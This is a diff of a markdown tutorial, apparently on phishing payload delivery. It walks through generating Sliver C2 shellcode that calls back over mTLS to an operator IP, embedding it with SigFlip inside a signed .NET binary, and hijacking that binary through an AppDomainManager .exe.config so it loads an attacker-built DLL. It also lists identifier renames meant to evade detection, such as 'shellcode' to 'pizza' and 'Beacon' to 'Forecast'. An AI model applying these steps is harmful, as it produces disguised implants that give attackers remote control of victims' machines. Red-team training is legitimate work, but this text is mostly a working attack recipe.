@@ -13,34 +13,55 @@ We need a .net binary with a .exe.config file. Windows has lots of those in `C:\
 
 ![Windows Executable with Config](/static/how-to-phishing/windows-executable-with-config.png)
 
-Generate shellcode
+### Generate shellcode
+
+In a sliver shell we need to run the following be sure to replace the ip with your vm's ip.
+
+```bash
+generate --mtls replaceip -f shellcode --save implants/shellcodex64.bin
+```
+
+Copy the shellcode to your windows machine.
 
 
 ```bash
-./SigFlip.exe -i "C:\Users\Administrator\Desktop\frostbyte-main\jsc.exe" "C:\Users\Administrator\Desktop\frostbyte-main\beacon64.bin" "C:\Users\Administrator\Desktop\frostbyte-main\test.exe" "secret"
+SigFlip.exe -i "C:\Users\testuser\Desktop\frostbyte-main\jsc.exe" "C:\Users\testuser\Desktop\frostbyte-main\shellcodex64.bin" "C:\Users\testuser\Desktop\frostbyte-main\AuthHelper.exe" "iamadumbsecret"
 ```
 
-We need to update the config file and replace the values of update and A54IPK. We also need to update `privatePath` to be a relative path `.`
+- We need to replace `test` with our executabe name our executable name without the extenaion (`AuthHelper`). 
+- Next we need to update the value of `appDomainManagerType` to be something else `NewAuthHelper`.
+- Finally lets make `privatePath` a relative path `.`
+- save as `AuthHelper.exe.config`
 
-
-open test.cs in visual studio. change the value of A54IPK 
-
-
-```  
-
-byte[] _peBlob = Read("test.exe");
-
-byte[] _data = Decrypt(shellcode, "secret");
+```xml
+<configuration>
+   <runtime>
+      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
+         <probing privatePath="."/>
+      </assemblyBinding> 
+	  <appDomainManagerAssembly value="AuthHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />  
+	  <appDomainManagerType value="NewAuthHelper" />  
+   </runtime>
+</configuration>
 ```
-build ....
 
+Now we need to update the `test.cs` file.
+
+- remove top three lines prepended with `#`
+- replace `Z45UDG` with `NewAuthHelper`
+- comment out logging
+- replace `S3cretK3y` with `iamadumbsecret`
+- change `Z:\\zloader\\update.exe` to `AuthHelper.exe`
+- replace all instances of `shellcode` with `pizza`
+- replace `ClassExample` with `WeatherChecker`
+- replace `Beacon` with `Forecast`
+- replace `Decrypt` with `Process`
 
 We'll also want to change some of the code to be a little different
 
 
 ```
-C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:test.dll ..\frostbyte-main\test.cs
-
+C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:AuthHelper.dll test.cs
 ```
 
 
